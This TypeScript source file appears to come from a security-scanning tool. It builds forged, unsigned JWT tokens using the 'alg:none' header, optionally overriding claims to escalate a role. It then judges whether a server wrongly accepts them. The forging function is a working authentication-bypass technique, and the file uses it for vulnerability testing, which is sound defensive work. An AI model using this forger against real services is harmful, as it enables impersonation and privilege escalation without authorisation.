// JWT "alg:none" forgery oracle for the exploration layer (explore.jwt-none).
//
// A server that verifies a JWT correctly rejects a token whose header says
// alg:none (no signature). One that accepts it lets anyone forge any identity.
// The proof is a differential: a forged alg:none token (same claims, no
// signature) is ACCEPTED where no token at all is DENIED. Generic — no secret,
// no target signature; the validator re-encodes the model's own token.

const b64url = (s: string) => Buffer.from(s, "utf8").toString("base64url");
const b64urlDecode = (s: string) => { try { return Buffer.from(s, "base64url").toString("utf8"); } catch { return ""; } };

/** From a real JWT, build an unsigned alg:none token with the same payload
 * (optionally with a few claims overridden, e.g. to escalate role). */
export function forgeNoneToken(jwt: string, override?: Record<string, unknown>): string | null {
  const parts = jwt.split(".");
  if (parts.length < 2) return null;
  const payloadRaw = b64urlDecode(parts[1]!);
  let payload: Record<string, unknown>;
  try { payload = JSON.parse(payloadRaw) as Record<string, unknown>; } catch { return null; }
  if (override) Object.assign(payload, override);
  const header = b64url(JSON.stringify({ alg: "none", typ: "JWT" }));
  // "none" tokens end with a trailing dot and an empty signature.
  return `${header}.${b64url(JSON.stringify(payload))}.`;
}

export interface Observed { status: number; body: string }
const DENY = new Set([401, 403]);
const ok2xx = (s: number) => s >= 200 && s < 300;

/** Proven iff the forged unsigned token is accepted where the anonymous request
 * is denied (and the two responses differ). Pure, testable. */
export function jwtNoneOracle(input: { forged: Observed; anon: Observed }): { verdict: "proven" | "lead" | "denied"; reason: string } {
  const { forged, anon } = input;
  if (!ok2xx(forged.status)) return { verdict: "denied", reason: `the alg:none token was rejected (HTTP ${forged.status})` };
  if (DENY.has(anon.status) && forged.body !== anon.body) {
    return { verdict: "proven", reason: `an unsigned alg:none token is accepted (HTTP ${forged.status}) where no token is denied (HTTP ${anon.status})` };
  }
  if (ok2xx(anon.status)) return { verdict: "lead", reason: "the endpoint also answers without any token: not auth-gated, review by hand" };
  return { verdict: "lead", reason: `alg:none gave HTTP ${forged.status} but the control is inconclusive` };
}
